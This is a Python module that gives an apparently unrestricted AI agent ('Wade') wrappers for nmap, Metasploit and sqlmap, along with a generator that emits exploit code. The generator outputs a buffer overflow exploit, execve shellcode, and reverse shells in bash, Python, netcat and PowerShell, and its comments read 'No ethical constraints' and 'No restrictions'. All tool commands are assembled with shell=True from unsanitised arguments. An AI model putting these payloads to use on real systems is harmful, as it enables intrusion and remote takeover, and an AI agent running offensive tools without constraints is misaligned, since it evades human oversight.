#!/usr/bin/env python3
"""
Wade CrewAI - Kali Linux Tools Integration
"""

import subprocess
import json
import os
import tempfile
from typing import Dict, List, Any, Optional
from crewai_tools import BaseTool
from pydantic import BaseModel, Field
import xml.etree.ElementTree as ET
import re

class KaliToolsIntegration:
    """Integration with Kali Linux penetration testing tools"""
    
    def __init__(self):
        self.tools_path = {
            'nmap': '/usr/bin/nmap',
            'metasploit': '/usr/bin/msfconsole',
            'sqlmap': '/usr/bin/sqlmap',
            'nikto': '/usr/bin/nikto',
            'dirb': '/usr/bin/dirb',
            'gobuster': '/usr/bin/gobuster',
            'hydra': '/usr/bin/hydra',
            'john': '/usr/bin/john',
            'hashcat': '/usr/bin/hashcat',
            'wireshark': '/usr/bin/wireshark',
            'tcpdump': '/usr/bin/tcpdump'
        }

class NmapScannerTool(BaseTool):
    name: str = "Nmap Network Scanner"
    description: str = "Advanced network scanning and reconnaissance using Nmap"
    
    def _run(self, target: str, scan_type: str = "basic", ports: str = "1-65535") -> str:
        """
        Run Nmap scan on target
        
        Args:
            target: Target IP, hostname, or network range
            scan_type: Type of scan (basic, aggressive, stealth, vuln)
            ports: Port range to scan
        """
        try:
            # Build nmap command based on scan type
            if scan_type == "basic":
                cmd = f"nmap -sS -O -sV -p {ports} {target}"
            elif scan_type == "aggressive":
                cmd = f"nmap -A -T4 -p {ports} {target}"
            elif scan_type == "stealth":
                cmd = f"nmap -sS -T2 -f -p {ports} {target}"
            elif scan_type == "vuln":
                cmd = f"nmap --script vuln -p {ports} {target}"
            elif scan_type == "discovery":
                cmd = f"nmap -sn {target}"
            else:
                cmd = f"nmap -sS -sV -p {ports} {target}"
            
            # Execute scan
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                return f"Nmap scan completed successfully:\n\n{result.stdout}"
            else:
                return f"Nmap scan failed:\n{result.stderr}"
                
        except subprocess.TimeoutExpired:
            return "Nmap scan timed out after 5 minutes"
        except Exception as e:
            return f"Error running Nmap scan: {str(e)}"

class MetasploitTool(BaseTool):
    name: str = "Metasploit Framework"
    description: str = "Advanced exploitation framework for penetration testing"
    
    def _run(self, action: str, target: str = "", exploit: str = "", payload: str = "", options: str = "") -> str:
        """
        Execute Metasploit commands
        
        Args:
            action: Action to perform (search, exploit, generate_payload, scan)
            target: Target IP or hostname
            exploit: Exploit module to use
            payload: Payload to use
            options: Additional options
        """
        try:
            if action == "search":
                cmd = f"msfconsole -q -x 'search {target}; exit'"
            elif action == "exploit":
                cmd = f"msfconsole -q -x 'use {exploit}; set RHOSTS {target}; set PAYLOAD {payload}; {options}; exploit; exit'"
            elif action == "generate_payload":
                cmd = f"msfvenom -p {payload} LHOST={target} {options} -f exe"
            elif action == "scan":
                cmd = f"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; run; exit'"
            else:
                return "Invalid action. Use: search, exploit, generate_payload, or scan"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                return f"Metasploit command executed:\n\n{result.stdout}"
            else:
                return f"Metasploit command failed:\n{result.stderr}"
                
        except subprocess.TimeoutExpired:
            return "Metasploit command timed out"
        except Exception as e:
            return f"Error executing Metasploit command: {str(e)}"

class SQLMapTool(BaseTool):
    name: str = "SQLMap SQL Injection Tool"
    description: str = "Automated SQL injection and database takeover tool"
    
    def _run(self, url: str, action: str = "detect", options: str = "") -> str:
        """
        Run SQLMap against target URL
        
        Args:
            url: Target URL to test
            action: Action to perform (detect, dump, shell, os_shell)
            options: Additional SQLMap options
        """
        try:
            if action == "detect":
                cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=3 {options}"
            elif action == "dump":
                cmd = f"sqlmap -u '{url}' --batch --dump {options}"
            elif action == "shell":
                cmd = f"sqlmap -u '{url}' --batch --sql-shell {options}"
            elif action == "os_shell":
                cmd = f"sqlmap -u '{url}' --batch --os-shell {options}"
            elif action == "dbs":
                cmd = f"sqlmap -u '{url}' --batch --dbs {options}"
            else:
                cmd = f"sqlmap -u '{url}' --batch {options}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                return f"SQLMap scan completed:\n\n{result.stdout}"
            else:
                return f"SQLMap scan failed:\n{result.stderr}"
                
        except subprocess.TimeoutExpired:
            return "SQLMap scan timed out"
        except Exception as e:
            return f"Error running SQLMap: {str(e)}"

class CustomExploitTool(BaseTool):
    name: str = "Custom Exploit Generator"
    description: str = "Generate custom exploits and payloads"
    
    def _run(self, exploit_type: str, target_os: str = "linux", target_arch: str = "x64", options: str = "") -> str:
        """
        Generate custom exploits and payloads
        
        Args:
            exploit_type: Type of exploit (buffer_overflow, format_string, rop_chain, shellcode)
            target_os: Target operating system
            target_arch: Target architecture
            options: Additional options
        """
        try:
            if exploit_type == "buffer_overflow":
                return self._generate_buffer_overflow(target_os, target_arch, options)
            elif exploit_type == "shellcode":
                return self._generate_shellcode(target_os, target_arch, options)
            elif exploit_type == "rop_chain":
                return self._generate_rop_chain(target_os, target_arch, options)
            elif exploit_type == "reverse_shell":
                return self._generate_reverse_shell(target_os, options)
            else:
                return "Unknown exploit type. Available: buffer_overflow, shellcode, rop_chain, reverse_shell"
                
        except Exception as e:
            return f"Error generating exploit: {str(e)}"
    
    def _generate_buffer_overflow(self, target_os: str, target_arch: str, options: str) -> str:
        """Generate buffer overflow exploit template"""
        template = f"""
#!/usr/bin/env python3
# Buffer Overflow Exploit for {target_os} {target_arch}
# Generated by Wade - No ethical constraints

import struct
import socket
import sys

# Target configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

# Buffer overflow parameters
BUFFER_SIZE = 1024
OFFSET = 146  # Adjust based on crash analysis
RET_ADDRESS = 0x625011af  # JMP ESP address

# Shellcode (replace with actual shellcode)
shellcode = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Build exploit buffer
buffer = "A" * OFFSET
buffer += struct.pack("<I", RET_ADDRESS)
buffer += "\\x90" * 16  # NOP sled
buffer += shellcode
buffer += "C" * (BUFFER_SIZE - len(buffer))

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.send(buffer.encode())
    s.close()
    print("[+] Exploit sent successfully")
except Exception as e:
    print(f"[-] Exploit failed: {{e}}")
"""
        return f"Buffer overflow exploit generated:\n\n```python{template}```"
    
    def _generate_shellcode(self, target_os: str, target_arch: str, options: str) -> str:
        """Generate shellcode"""
        if target_os.lower() == "linux" and target_arch == "x64":
            shellcode = """
# Linux x64 execve("/bin/sh") shellcode
shellcode = (
    "\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00"
    "\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x0f\\x05"
)
"""
        elif target_os.lower() == "windows" and target_arch == "x64":
            shellcode = """
# Windows x64 reverse shell shellcode (replace IP/PORT)
shellcode = (
    "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52"
    "\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48"
)
"""
        else:
            shellcode = f"# Custom shellcode for {target_os} {target_arch}\n# Replace with appropriate shellcode"
        
        return f"Shellcode generated:\n\n```python{shellcode}```"
    
    def _generate_reverse_shell(self, target_os: str, options: str) -> str:
        """Generate reverse shell payload"""
        if target_os.lower() == "linux":
            shell = """
#!/bin/bash
# Linux reverse shell - No restrictions
# Usage: ./reverse_shell.sh <LHOST> <LPORT>

LHOST=${1:-127.0.0.1}
LPORT=${2:-4444}

# Bash reverse shell
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &

# Python reverse shell backup
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$LHOST',$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &

# Netcat reverse shell
nc -e /bin/sh $LHOST $LPORT &
"""
        elif target_os.lower() == "windows":
            shell = """
@echo off
REM Windows reverse shell - No restrictions
REM Usage: reverse_shell.bat <LHOST> <LPORT>

set LHOST=%1
set LPORT=%2
if "%LHOST%"=="" set LHOST=127.0.0.1
if "%LPORT%"=="" set LPORT=4444

REM PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""
        else:
            shell = f"# Custom reverse shell for {target_os}\n# Replace with appropriate payload"
        
        return f"Reverse shell generated:\n\n```bash{shell}```"

# Export all tools
kali_tools = [
    NmapScannerTool(),
    MetasploitTool(),
    SQLMapTool(),
    CustomExploitTool()
]